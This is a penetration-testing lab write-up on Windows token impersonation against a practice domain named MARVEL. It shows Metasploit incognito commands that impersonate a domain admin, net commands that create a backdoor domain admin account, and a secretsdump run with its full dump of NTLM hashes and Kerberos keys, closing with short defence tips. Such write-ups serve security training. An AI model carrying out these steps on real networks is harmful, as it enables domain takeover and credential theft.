
## Windows Security Tokens

Windows uses [[Security Access Tokens]] to represent identities and grand or deny access to resources based on them. There are two types of tokens, [[Primary Tokens]] and [[Impersonation Tokens]], and this attack we will be exploiting the *Impersonation Token*.

Under impersonation tokens, there are four different impersonation levels available to control how much the thread using the impersonation token can do.

1. **Anonymous**: No identity information is available
2. **Identification**: Can query the client's identity but cannot perform actions as them
3. **Impersonation**: Can act as the client on the *local machine only*
4. **Delegation**: Can act as the client *on remote systems*

From the amount of control available, we can see the delegation token is the most lucrative option for a compromise. Hence we will focus on how to use than toke for an attack next.

## Incognito Attack

For this attack we will be using the incognito module available in [[Metasploit]]. However, before running the module, we need to gain shell access to the compromised machine. This can be done using `psexec` as shown [[Gaining Shell Access#^shellAccess|here]].

Once we have the meterpreter session and spawned a shell, we can check who we are with the `whoami` command and see that we are `NT AUTHORITY\SYSTEM`.

```batch
meterpreter > shell
Process 7944 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.5608]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We need to exit from the shell to the meterpreter session to load the module and then *list* the available *tokens by users* with the `-u` flag. The `-g` will list by groups.

```bash
C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
 
meterpreter > load incognito 
Loading extension incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

Since we have already logon to the machine as `fcastle`, we see there is a delegation token created for that user named `MARVEL\fcastle`. 

We can use this token to impersonate this user and spawn a new shell as them as shown below.

```bash
meterpreter > impersonate_token MARVEL\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
meterpreter > shell
Process 5028 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.5608]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\fcastle
```

Since this is a domain user, we cannot use this token to access the domain controller and perform any action. However, if a domain admin was logged in to this compromised machine while we are deploying the attack, we can impersonate them instead.

So we logout as `fcastle` and log in to the machine as the domain admin. Now when we list down the tokens, we can see a domain admin delegation token.

```bash
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-2
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
meterpreter > getuid 
Server username: MARVEL\Administrator
meterpreter > shell
Process 6700 created.
Channel 3 created.
Microsoft Windows [Version 10.0.19045.5608]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\administrator
```

## Domain Compromise

Since we have a domain admin delegation token, we can use it to create a new user and add it to the domain admins group.

```batch
C:\Windows\system32>net user /add hawkeye Password1@ /domain
net user /add hawkeye Password1@ /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.
```

If we check the domain admins at this moment, there is no `hawkeye` since they are a domain user at this point.

![[Hawkeye Domain User.png]]

However, we can use the same token to add `hawkeye` to the domain admins group as follow.

```batch
C:\Windows\system32>net group "Domain Admins" hawkeye /add /domain
net group "Domain Admins" hawkeye /add /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.
```

Now if we check the domain admins group, we can see `hawkeye` has been added to it.

![[Hawkeye Domain Admin.png]]

Then we can use `secretsdump.py` with the newly added credentials to dump the secrets of the domain controller (`192.168.23.130`) and compromise the domain.

```bash
$ secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.23.130       
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2dbe94cf6d9414061188dd2d0c4fbf9a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:d1ac4b2be983bdd0e86367c4e6fb707bc9d40b01f8473f1e845c669bdf454e26
MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:fdb59c704c1f760379313776bfda48f6
MARVEL\HYDRA-DC$:des-cbc-md5:98794091ba58e537
MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:69646703f8dc139544866f750f803717:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1e5b4524e77c6d22171966bea7726c6011d89f93
dpapi_userkey:0x6cc7e0ad6631f1b4e0245dbdcff16fb0796758c5
[*] NL$KM 
 0000   83 9E 18 DE 5F A1 79 38  CA 05 20 13 81 A6 EF A4   ...._.y8.. .....
 0010   A1 2F EB CD 9E 5C 84 95  58 45 38 E7 EA 04 8C 22   ./...\..XE8...."
 0020   A4 EA A2 D8 14 0B 08 B2  93 EA 91 20 38 C1 BC 77   ........... 8..w
 0030   B0 33 AD 3A 1B 9A B3 11  3C 1D C0 36 B9 5F 78 ED   .3.:....<..6._x.
NL$KM:839e18de5fa17938ca05201381a6efa4a12febcd9e5c8495584538e7ea048c22a4eaa2d8140b08b293ea912038c1bc77b033ad3a1b9ab3113c1dc036b95f78ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:95429b379eb022b428e2acb40508a8bc:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:8c3efc486704d2ee71eebe71af14d86c:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SqaSKUfcVl:1112:aad3b435b51404eeaad3b435b51404ee:ada2848eddc9cc62b2c83e36671cb5c3:::
hawkeye:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:69646703f8dc139544866f750f803717:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2a5d646955ce36f130d78437a585dd76:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:ead11176853925d8c6855102816bd3ea:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:19a70742728b2cbfa1b8d6f0fc6767ecb6f5a39ba56b560e4e486e71ec4d6194
Administrator:aes128-cts-hmac-sha1-96:fd317f36e2a6582bfda992447c3b9731
Administrator:des-cbc-md5:2a8538b0b92c83d0
krbtgt:aes256-cts-hmac-sha1-96:65bfedc0f2ebba5319b630550530430ffdc48c9d480602b67400ed5586c979c1
krbtgt:aes128-cts-hmac-sha1-96:7ce1819783c8b003637a939857b99bd2
krbtgt:des-cbc-md5:c2674ac46d344564
MARVEL.local\tstark:aes256-cts-hmac-sha1-96:53c8c218f1032ef9c7bf028288f10c602881e8bdfc1bb78af732e0dd6df339a0
MARVEL.local\tstark:aes128-cts-hmac-sha1-96:5a0e52a703ac8ac718a3a45a2a18687e
MARVEL.local\tstark:des-cbc-md5:4a2c5498d04994df
MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93
MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e
MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba
MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
MARVEL.local\pparker:aes256-cts-hmac-sha1-96:5fc6b0c6792c9a3b62432eda4a61e5c71efc2c57f5466abea92ac4c16fcae580
MARVEL.local\pparker:aes128-cts-hmac-sha1-96:7693d96d854240b8c654c1f8a86387e1
MARVEL.local\pparker:des-cbc-md5:e3d640734938ec34
SqaSKUfcVl:aes256-cts-hmac-sha1-96:b71ab0dbb70ea82079bce8fe5edbc4479a3ad0dc5a3a1d7e61b2bf74c19b8533
SqaSKUfcVl:aes128-cts-hmac-sha1-96:ff89bdf8c3ff4807f9d95634e624f5bf
SqaSKUfcVl:des-cbc-md5:6d198fb0a4d370d0
hawkeye:aes256-cts-hmac-sha1-96:70306b40ac0b9da21903551fa70b3191b61d88749e356b11cbe93721a0d3b471
hawkeye:aes128-cts-hmac-sha1-96:2ee48035a17365b1951d8a8105c917e4
hawkeye:des-cbc-md5:01f758f731b6757c
HYDRA-DC$:aes256-cts-hmac-sha1-96:d1ac4b2be983bdd0e86367c4e6fb707bc9d40b01f8473f1e845c669bdf454e26
HYDRA-DC$:aes128-cts-hmac-sha1-96:fdb59c704c1f760379313776bfda48f6
HYDRA-DC$:des-cbc-md5:32e04fa4190189e9
THEPUNISHER$:aes256-cts-hmac-sha1-96:f71a66a6c7700407c59fa5399c524bdfb38c4ee8c57dd10a1f089e3da8306e75
THEPUNISHER$:aes128-cts-hmac-sha1-96:0f14b2573aeea308ffa7b4b64ce9b982
THEPUNISHER$:des-cbc-md5:d99826efb02a01b9
SPIDERMAN$:aes256-cts-hmac-sha1-96:8f911c8c3d06e1697c6c8528505603a2d34a61bcc01a5db8ee1084a23926a0ef
SPIDERMAN$:aes128-cts-hmac-sha1-96:10ff6b4021e0fd514c2c8b6c3b5248fc
SPIDERMAN$:des-cbc-md5:3bba91318019ad4f
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```


> [!error] Compromising the Domain
> We successfully compromised the domain without ever needing to crack the hash or compromising a password of a domain admin in this attack. The only requirement was an admin to be logged on to a compromised domain machine. This usually happens when an admin logs in and switches to another user without logging out.

## Defence

There are several ways to defend against this attack

1. Restrict delegation and impersonation privileges
2. Using least privilege principles
3. Local admin restriction